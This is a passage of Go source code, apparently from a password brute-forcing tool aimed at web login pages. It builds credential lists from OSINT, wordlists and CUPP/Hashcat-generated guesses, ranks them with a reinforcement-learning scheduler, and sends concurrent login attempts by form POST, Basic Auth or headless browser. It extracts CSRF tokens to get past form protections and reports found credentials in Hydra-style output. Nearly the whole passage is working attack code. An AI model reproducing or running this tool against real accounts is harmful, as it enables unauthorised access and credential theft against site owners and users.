			fmt.Printf(" Using OSINT-generated usernames\n")
		}
	} else if *username != "" {
		usernames = []string{*username}
	} else {
		usernames, err = loadWordlist(*usernameList)
		if err != nil {
			fmt.Printf("? Error loading username list: %v\n", err)
			os.Exit(1)
		}
	}

	// Load passwords (OSINT or wordlist)
	if len(osintPasswords) > 0 {
		passwords = osintPasswords
		if !*quiet {
			fmt.Printf(" Using OSINT-generated passwords\n")
		}
	} else if *password != "" {
		passwords = []string{*password}
	} else {
		passwords, err = loadWordlist(*passwordList)
		if err != nil {
			fmt.Printf("? Error loading password list: %v\n", err)
			os.Exit(1)
		}
	}


	if !*quiet {
		fmt.Printf("? Loaded %d usernames\n", len(usernames))
		fmt.Printf("? Loaded %d passwords\n\n", len(passwords))
	}

	// CLEVER: Pre-generate smart passwords for interesting usernames!
	// This is MUCH better than waiting 50 attempts - try smart passwords FIRST!
	smartPasswords := make(map[string][]string) // username -> smart passwords
	cuppPath := findCUPP()

	for _, username := range usernames {
		// Check if username is interesting (person or keyword)
		if looksLikePersonName(username) || shouldRunCUPPForKeyword(username) {
			if !*quiet {
				toolName := "CUPP"
				if shouldRunCUPPForKeyword(username) {
					toolName = "HASHCAT"
				}
				fmt.Printf("? Pre-generating %s passwords for '%s'...\n", toolName, username)
			}

			// Generate smart passwords (CUPP for persons, Hashcat for keywords)
			passwords, err := runCUPPForUsername(cuppPath, username)
			if err == nil && len(passwords) > 0 {
				// Keep ALL passwords (Hashcat generates ~141, CUPP ~176)
				// RL will prioritize them anyway, so no need to pre-filter
				smartPasswords[username] = passwords

				if !*quiet {
					fmt.Printf("   ? Generated %d smart passwords\n", len(passwords))
				}
			}
		}
	}

	if !*quiet && len(smartPasswords) > 0 {
		fmt.Println()
	}

	// Generate all credentials - CLEVER prioritization!
	// Smart passwords FIRST (high score), wordlist SECOND (normal score)
	var allCreds []Credential

	for _, user := range usernames {
		// Strategy 1: Add smart passwords with SMART SCORING (ML-based prioritization)
		if smartPwds, exists := smartPasswords[user]; exists {
			for _, pass := range smartPwds {
				allCreds = append(allCreds, Credential{
					Username: user,
					Password: pass,
					Score:    scorePasswordSmart(pass, user), // SMART scoring - Admin123 gets ~2000, nimda gets ~500!
				})
			}
		}

		// Strategy 2: Add wordlist passwords with NORMAL priority (score=0)
		for _, pass := range passwords {
			allCreds = append(allCreds, Credential{
				Username: user,
				Password: pass,
				Score:    0.0, // Normal priority - try after smart passwords
			})
		}
	}

	// All credentials added - no hardcoded prioritization!
	totalCreds := len(allCreds)

	if !*quiet {
	if !*quiet {
		fmt.Printf(" Total combinations: %d\n", totalCreds)
		fmt.Println(" Starting RL-driven adaptive attack (no hardcoded bias)...\n")
	}
	}

	rl := NewUltimateRL(*learningRateFlag)
	numWorkers := *workers
	batchSize := *batchSizeFlag

	jar, _ := cookiejar.New(nil)
	client := &http.Client{
		Jar: jar,
		Transport: &http.Transport{
			MaxIdleConns:        numWorkers * 2,
			MaxIdleConnsPerHost: numWorkers * 2,
			IdleConnTimeout:     90 * time.Second,
			DisableCompression:  true,
		},
		Timeout: time.Duration(*timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			return http.ErrUseLastResponse
		},
	}

	// Parse success codes if provided
	var successCodes map[int]bool
	if *successCode != "" {
		successCodes = make(map[int]bool)
		for _, code := range strings.Split(*successCode, ",") {
			var c int
			fmt.Sscanf(strings.TrimSpace(code), "%d", &c)
			if c > 0 {
				successCodes[c] = true
			}
		}
	}

	var (
		attempts   int64
		startTime  = time.Now()
		found      = make(chan Credential, 1)
		mu         sync.Mutex
		processing = 0
	)

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	credChan := make(chan Credential, numWorkers*2)
	var wg sync.WaitGroup

	for i := 0; i < numWorkers; i++ {
		wg.Add(1)
		go func() {
			defer wg.Done()
			for {
				select {
				case <-ctx.Done():
					return
				case cred, ok := <-credChan:
					if !ok {
						return
					}

					if *verbose {
						fmt.Printf("[ATTEMPT] %s:%s\n", cred.Username, cred.Password)
					}

					var success bool
					var respTime time.Duration

					// Use headless browser mode if enabled
					if *headless {
						successIndicators := make(map[string]string)
						if *successText != "" {
							successIndicators["text"] = *successText
						}
						if failureString != "" {
							successIndicators["failure"] = failureString
						}
						successIndicators["url"] = "logged-in-successfully"

						success, respTime = attemptLoginHeadless(ctx, target, userField, passField, cred.Username, cred.Password, successIndicators)
						rl.learn(cred.Username, cred.Password, respTime, success)

						// Show progress in headless mode
						currentAttempts := atomic.LoadInt64(&attempts) + 1
						if !*quiet {
							percentage := float64(currentAttempts) / float64(totalCreds) * 100
							fmt.Printf("\r[%d/%d] (%.1f%%) Testing %s:%s - %s    ",
								currentAttempts, totalCreds, percentage,
								cred.Username, cred.Password,
								map[bool]string{true: "? SUCCESS", false: "? Failed"}[success])
							if success {
								fmt.Println() // New line on success
							}
						}

						if success {
							select {
							case found <- cred:
								cancel()
							default:
							}
							atomic.AddInt64(&attempts, 1)
							mu.Lock()
							processing--
							mu.Unlock()
							return
						}

						atomic.AddInt64(&attempts, 1)
						mu.Lock()
						processing--
						mu.Unlock()
						continue
					}

					// HTTP mode (original code)
					attemptStart := time.Now()

					var req *http.Request

					// Check if using Basic Auth
					if useBasicAuth {
						// Basic Auth: Simple GET request with Authorization header
						req, _ = http.NewRequestWithContext(ctx, "GET", target, nil)
						req.SetBasicAuth(cred.Username, cred.Password)
					} else {
						// Form-based auth
						data := url.Values{}
						data.Set(userField, cred.Username)
						data.Set(passField, cred.Password)

						// Extract CSRF token if present
						getResp, err := client.Get(target)
						if err == nil {
							getBody, _ := io.ReadAll(getResp.Body)
							getResp.Body.Close()

							// Try common CSRF field names
							for _, csrfField := range []string{"CSRFToken", "csrf_token", "_csrf", "authenticity_token", "_token"} {
								if token := extractCSRF(string(getBody), csrfField); token != "" {
									data.Set(csrfField, token)
									break
								}
							}
						}

						if httpMethod == "GET" {
							// GET: Add parameters to URL
							targetWithParams := target
							if strings.Contains(target, "?") {
								targetWithParams += "&" + data.Encode()
							} else {
								targetWithParams += "?" + data.Encode()
							}
							req, _ = http.NewRequestWithContext(ctx, "GET", targetWithParams, nil)
						} else {
							// POST: Send as form data
							req, _ = http.NewRequestWithContext(ctx, "POST", target, strings.NewReader(data.Encode()))
							req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
						}
					}

					// Add custom headers
					for key, value := range customHeaders {
						req.Header.Set(key, value)
					}

					resp, err := client.Do(req)
					respTime = time.Since(attemptStart)

					// Handle network errors
					if err != nil {
						errorType := classifyError(nil, "", err)
						rl.learnWithError(cred.Username, cred.Password, respTime, false, errorType)

						atomic.AddInt64(&attempts, 1)
						mu.Lock()
						processing--
						mu.Unlock()
						continue
					}

					if err == nil {
						body, _ := io.ReadAll(resp.Body)
						resp.Body.Close()
						bodyStr := string(body)

						if *verbose && len(bodyStr) == 0 {
							fmt.Printf("[DEBUG] Empty body! Status: %d, Content-Length: %s, Content-Encoding: %s\n",
								resp.StatusCode, resp.Header.Get("Content-Length"), resp.Header.Get("Content-Encoding"))
						}

						// Enhanced success detection with multiple strategies
						success = false

						// Basic Auth: 200 = success, 401 = failure
						if useBasicAuth {
							success = (resp.StatusCode == 200)
						} else {
							// Form-based authentication detection

						// 1. Check custom success codes if specified
						if len(successCodes) > 0 {
							success = successCodes[resp.StatusCode]
						}

						// 2. Check for any redirect if --any-redirect flag is set
						if !success && *anyRedirect && resp.StatusCode >= 300 && resp.StatusCode < 400 {
							success = true
						}

						// 3. Check for redirect containing "success" (default behavior)
						if !success && resp.StatusCode >= 300 && resp.StatusCode < 400 {
							location := resp.Header.Get("Location")
							if location != "" {
								// If --any-redirect not set, check for "success" in redirect
								if *anyRedirect {
									success = true
								} else if strings.Contains(location, "success") {
									success = true
								}
							}
						}

						// 4. Check for success text in body
						if !success && *successText != "" && strings.Contains(bodyStr, *successText) {
							success = true
						}

						// 5. Check for success cookie
						if !success && *successCookie != "" {
							for _, cookie := range resp.Cookies() {
								if cookie.Name == *successCookie {
									success = true
									break
								}
							}
						}

						// 6. Check failure string (if present and no other success indicators)
						if !success && failureString != "" {
							// If failure string NOT found in response, it's a success
							hasFailure := strings.Contains(bodyStr, failureString)
							success = !hasFailure
							if *verbose && success {
								fmt.Printf("[DEBUG] No failure string found for %s:%s\n", cred.Username, cred.Password)
							}
						}

						// 7. Verify success: check if still on login page (password field present)
						if success && strings.Contains(bodyStr, `type="password"`) {
							success = false // Still on login page
						}

						// 8. Default: 200 OK is success (if no other rules matched)
						if !success && len(successCodes) == 0 && !*anyRedirect && *successText == "" && *successCookie == "" && failureString == "" {
							success = resp.StatusCode == 200
						}
						} // End of form-based detection

						// Classify error type for intelligent stopping
						errorType := classifyError(resp, bodyStr, nil)
						rl.learnWithError(cred.Username, cred.Password, respTime, success, errorType)

						if success {
							select {
							case found <- cred:
								cancel()
							default:
							}
							return
						}
					}

					atomic.AddInt64(&attempts, 1)
					mu.Lock()
					processing--
					mu.Unlock()
				}
			}
		}()
	}

	go func() {
		remaining := allCreds
		generation := 0

		// Track failures per username for adaptive CUPP triggering
		usernameFailures := make(map[string]int)
		cuppTriggered := make(map[string]bool)
		cuppPath := findCUPP() // Check if CUPP is available

		for len(remaining) > 0 && ctx.Err() == nil {
			generation++

			remaining = rl.prioritize(remaining)

			currentBatch := batchSize
			// Aggressive exploitation after learning
			if generation > 3 && rl.exploitMode {
				currentBatch = batchSize / 3 // Very small batches when exploiting
			} else if generation > 3 {
				currentBatch = batchSize / 2
			}

			if currentBatch > len(remaining) {
				currentBatch = len(remaining)
			}

			batch := remaining[:currentBatch]
			remaining = remaining[currentBatch:]

			for _, cred := range batch {
				// Check intelligent stopping criteria
				if shouldStop, reason := rl.shouldStop(); shouldStop {
					if !*quiet {
						fmt.Printf("\n%s\n", reason)
					}
					close(credChan)
					cancel()
					return
				}

				mu.Lock()
				processing++
				mu.Unlock()

				select {
				case <-ctx.Done():
					close(credChan)
					return
				case credChan <- cred:
				}
			}

			for {
				mu.Lock()
				p := processing
				mu.Unlock()
				if p < numWorkers/2 || ctx.Err() != nil {
					break
				}
				time.Sleep(10 * time.Millisecond)
			}

		// Adaptive CUPP Injection: Track failures and inject CUPP passwords
		if cuppPath != "" { // Only if CUPP is available
			// Count attempts per username in this batch (assume failures unless success found)
			rl.mu.RLock()
			hasSuccess := len(rl.successPatterns) > 0
			rl.mu.RUnlock()

			if !hasSuccess {
				// No success yet - count all batch attempts as failures
				for _, cred := range batch {
					usernameFailures[cred.Username]++
				}
			}

			// Check each username: should we trigger CUPP?
			for username, failures := range usernameFailures {
				// Adaptive CUPP trigger threshold: 50 failures
				// Trigger for BOTH person-like usernames (john.smith) AND keywords (admin, root)
				if failures >= 50 && !cuppTriggered[username] && (looksLikePersonName(username) || shouldRunCUPPForKeyword(username)) {
					// CUPP TRIGGER! Generate passwords for this username
					cuppPasswords, err := runCUPPForUsername(cuppPath, username)
					if err == nil && len(cuppPasswords) > 0 {
						// Filter CUPP passwords using RL
						filteredCUPP := filterCUPPByRL(cuppPasswords, rl)

						if len(filteredCUPP) > 0 {
							if !*quiet {
								first, last := extractNamesFromUsername(username)
								fmt.Printf("\n? CUPP TRIGGERED for '%s' (%s %s) after %d failures\n",
									username, first, last, failures)
								fmt.Printf("   ? Generated %d CUPP passwords (filtered from %d)\n",
									len(filteredCUPP), len(cuppPasswords))
							}

							// Inject CUPP passwords into remaining credentials with HIGH priority
							newCreds := make([]Credential, 0, len(filteredCUPP))
							for _, pwd := range filteredCUPP {
								newCreds = append(newCreds, Credential{
									Username: username,
									Password: pwd,
									Score:    1000.0, // HIGH priority - try these first!
								})
							}

							// Prepend to remaining (will be prioritized in next iteration)
							remaining = append(newCreds, remaining...)
							totalCreds += len(newCreds)

							cuppTriggered[username] = true
						}
					}
				}
			}
		}
			if !*quiet {
				mode := "EXPLORE"
				if rl.exploitMode {
					mode = "EXPLOIT"
				}

				fmt.Printf("? Gen %d [%s] | Attempts: %d/%d | Patterns: %d | UCB1 Arms: %d | Time: %.2fs\n",
					generation, mode, atomic.LoadInt64(&attempts), totalCreds,
					len(rl.patterns), len(rl.armScores), time.Since(startTime).Seconds())
			}
		}
		close(credChan)
	}()

	select {
	case cred := <-found:
		wg.Wait()
		elapsed := time.Since(startTime)

		// Hydra-like output format
		fmt.Printf("\n[%d][http-post-form] host: %s   login: %s   password: %s\n",
			*port, targetHost, cred.Username, cred.Password)
		fmt.Printf("1 of 1 target successfully completed, 1 valid password found\n")

		if !*quiet {
			fmt.Println()
			fmt.Println("? Performance Statistics")
			fmt.Println("==================================================")
			fmt.Printf("Total attempts: %d/%d (%.1f%% of search space)\n",
				atomic.LoadInt64(&attempts), totalCreds,
				float64(atomic.LoadInt64(&attempts))/float64(totalCreds)*100)
			fmt.Printf("Time elapsed: %.2fs\n", elapsed.Seconds())
			if elapsed.Seconds() > 0 {
				fmt.Printf("Average rate: %.0f req/s\n", float64(atomic.LoadInt64(&attempts))/elapsed.Seconds())
			}
			fmt.Printf("Genetic patterns evolved: %d\n", len(rl.patterns))
			fmt.Printf("UCB1 arms explored: %d\n", len(rl.armScores))
			fmt.Printf("Thompson distributions: %d\n", len(rl.alphaBeta))
			fmt.Printf("Search space reduction: %.1fx (only %.1f%% needed)\n",
				float64(totalCreds)/float64(atomic.LoadInt64(&attempts)),
				float64(atomic.LoadInt64(&attempts))/float64(totalCreds)*100)
		}

	case <-time.After(func() time.Duration {
		if *maxTime > 0 {
			return time.Duration(*maxTime) * time.Second
		}
		return 24 * time.Hour // Effectively no limit
	}()):
		cancel()
		wg.Wait()
		fmt.Println("\n0 of 1 target completed, 0 valid password found")
		if *maxTime > 0 {
			fmt.Printf("Timeout reached after %d seconds\n", *maxTime)
		} else {
			fmt.Println("Timeout reached after 24 hours")
		}
	}
}
